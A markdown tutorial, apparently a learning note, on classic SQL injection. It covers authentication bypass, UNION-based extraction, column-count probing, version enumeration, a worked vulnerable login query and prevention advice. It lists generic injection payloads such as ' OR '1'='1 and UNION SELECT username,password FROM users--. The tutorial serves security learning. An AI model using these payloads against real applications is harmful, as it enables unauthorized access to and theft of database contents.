# Classic SQL Injection

## 📌 Overview

Classic SQL Injection refers to direct SQL injection vulnerabilities where attacker-controlled input is interpreted as part of an SQL query by the backend database.

In these scenarios, the application often:

* Displays database errors
* Returns query results directly
* Responds visibly to injected payloads

This makes exploitation easier compared to blind SQL injection.

---

# 🧠 What is SQL Injection?

SQL Injection (SQLi) is a web vulnerability that allows attackers to manipulate database queries by injecting malicious SQL syntax into user input fields.

Applications become vulnerable when they concatenate unsanitized user input into SQL statements.

---

# 🔥 Common Attack Scenarios

## Authentication Bypass

Attackers can bypass login forms using payloads like:

```sql id="gx8n9d"
' OR '1'='1
```

---

## UNION-Based Injection

Used to retrieve data from other database tables.

Example:

```sql id="d7v2yy"
' UNION SELECT username,password FROM users--
```

---

## Database Enumeration

Attackers can identify:

* Database version
* Table names
* Column names
* Current user
* Privileges

Example:

```sql id="25q7zl"
' UNION SELECT @@version--
```

---

# 🔍 Identifying SQL Injection

## Common Indicators

* SQL syntax errors
* Different responses for true/false conditions
* Delayed responses
* Authentication bypass
* Unexpected data disclosure

---

# 🚀 Exploitation Methodology

## Step 1 — Test for Injection

Basic payloads:

```sql id="r8mxy8"
'
"
``
```

---

## Step 2 — Check Query Behavior

Boolean tests:

```sql id="6zhhlv"
' AND 1=1--
' AND 1=2--
```

---

## Step 3 — Determine Column Count

Using ORDER BY:

```sql id="zk0r0u"
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Or UNION SELECT:

```sql id="1lc34j"
' UNION SELECT NULL,NULL,NULL--
```

---

## Step 4 — Extract Data

Example:

```sql id="56pnwf"
' UNION SELECT username,password FROM users--
```

---

# 💥 Example Vulnerable Query

```sql id="1cr5vs"
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Injected input:

```sql id="hns8wx"
admin'--
```

Resulting query:

```sql id="cvbtr2"
SELECT * FROM users WHERE username = 'admin'--' AND password = '';
```

The password check becomes commented out.

---

# ⚠ Impact

Successful SQL injection may lead to:

* Authentication bypass
* Database disclosure
* Sensitive data theft
* Remote code execution (in some cases)
* Account takeover
* Complete database compromise

---

# 🛡 Prevention

## Recommended Mitigations

* Use parameterized queries
* Implement prepared statements
* Avoid dynamic SQL concatenation
* Validate and sanitize input
* Apply least privilege to database accounts
* Use ORM frameworks securely

---

# 🧰 Tools Used

* Burp Suite
* SQLMap
* Browser Developer Tools
* PortSwigger Web Security Academy

---

# 📚 Key Learning

Classic SQL injection demonstrates how improper handling of user input can compromise backend databases.

Understanding direct SQLi is essential before progressing to advanced topics like blind SQL injection, out-of-band exploitation, and database-specific attacks.

---

# 🏷 Tags

`#SQLInjection` `#SQLi` `#BurpSuite` `#WebSecurity` `#OWASP`
